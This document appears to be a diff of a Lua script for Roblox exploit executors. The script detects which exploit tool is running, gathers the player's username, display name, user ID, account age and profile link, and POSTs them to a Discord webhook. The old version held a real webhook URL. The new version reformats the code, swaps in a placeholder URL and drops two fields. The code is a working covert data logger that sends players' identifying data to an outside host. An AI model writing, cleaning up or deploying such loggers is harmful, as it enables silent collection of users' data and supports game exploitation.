@@ -4,72 +4,78 @@ local i="https://discord.com/api/webhooks/1265401096038252696/OgzlqfFt2PEMgYURal
 
 
 local function getexploit()
-local j=
-is_sirhurt_closure and"Sirhurt"or pebc_execute and"ProtoSmasher"or syn and"Synapse X"or
-secure_load and"Sentinel"or
-KRNL_LOADED and"Krnl"or
-SONA_LOADED and"Sona"or
-"Weird"
-return j
+    local j = 
+        is_sirhurt_closure and "Sirhurt" or 
+        pebc_execute and "ProtoSmasher" or 
+        syn and "Synapse X" or 
+        secure_load and "Sentinel" or 
+        KRNL_LOADED and "Krnl" or 
+        SONA_LOADED and "Sona" or 
+        "Weird"
+    return j
 end
 
-local j=game.Players.LocalPlayer
+local j = game.Players.LocalPlayer
 
-local k='New Script Execution!'
-local l={title=
-"__**New execution.**__",description=
-"Name: "..j.Name.."\nDisplay Name: "..j.DisplayName.."\nExploit: "..getexploit().."\nGame: https://www.roblox.com/games/"..game.PlaceId,type=
-"rich",color=
-tonumber(0xffff00),thumbnail=
-{url=
-"https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
-},image=
-{url=
-"http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..j.Name
-},fields=
-{
-{name=
-"__Account Age:__",value=
-j.AccountAge.." days old",inline=
-true
-},
-{name=
-"__User ID:__",value=
-j.UserId,inline=
-true
-},
-{name=
-"__JoinCode:__",value=
-j:FindFirstChild"JoinCode".Value,inline=
-true
-},
-{name=
-"__Username:__",value=
-j.Name,inline=
-true
-},
-{name=
-"__Display Name:__",value=
-j.DisplayName,inline=
-true
-},
-{name=
-"__Premium:__",value=
-a,inline=
-true
-},
-{name=
-"__Profile URL:__",value=
-"https://www.roblox.com/users/"..j.UserId.."/profile",inline=
-true
+local k = 'New Script Execution!'
+local l = {
+    title = "__**New execution.**__",
+    description = "Name: " .. j.Name .. "\nDisplay Name: " .. j.DisplayName .. "\nExploit: " .. getexploit() .. "\nGame: https://www.roblox.com/games/" .. game.PlaceId,
+    type = "rich",
+    color = tonumber(0xffff00),
+    thumbnail = {
+        url = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=768&height=432"
+    },
+    image = {
+        url = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username=" .. j.Name
+    },
+    fields = {
+        {
+            name = "__Account Age:__",
+            value = j.AccountAge .. " days old",
+            inline = true
+        },
+        {
+            name = "__User ID:__",
+            value = j.UserId,
+            inline = true
+        },
+        {
+            name = "__Username:__",
+            value = j.Name,
+            inline = true
+        },
+        {
+            name = "__Display Name:__",
+            value = j.DisplayName,
+            inline = true
+        },
+        {
+            name = "__Profile URL:__",
+            value = "https://www.roblox.com/users/" .. j.UserId .. "/profile",
+            inline = true
+        }
+    }
 }
-},
-};
-(syn and syn.request or http_request or http.request){
-Url=i;
-Method='POST';
-Headers={
-['Content-Type']='application/json';
-};
-Body=game:GetService'HttpService':JSONEncode{content=k;embeds={l};};
-};
+
+-- Removed the JoinCode field as it's not a standard property of the LocalPlayer
+-- Also removed the Premium field as it's not defined in the script
+
+local url = "YOUR_WEBHOOK_URL_HERE" -- Replace with your webhook URL
+local httpService = game:GetService("HttpService")
+
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+
+local body = httpService:JSONEncode({
+    content = k,
+    embeds = {l}
+})
+
+local request = (syn and syn.request or http_request or http.request)({
+    Url = url,
+    Method = "POST",
+    Headers = headers,
+    Body = body
+})
